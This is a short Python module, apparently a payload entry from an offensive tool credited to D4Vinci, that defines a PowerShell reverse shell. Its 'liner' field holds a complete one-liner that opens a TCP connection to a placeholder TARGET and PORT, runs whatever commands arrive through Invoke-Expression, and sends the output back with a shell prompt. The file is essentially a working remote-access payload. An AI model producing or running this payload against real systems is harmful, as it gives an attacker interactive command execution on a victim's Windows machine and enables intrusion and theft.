class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Simple powershell sockets tcp shell like the other but this time in string format."
    function    = "reverse shell"
    liner       = """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('TARGET',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
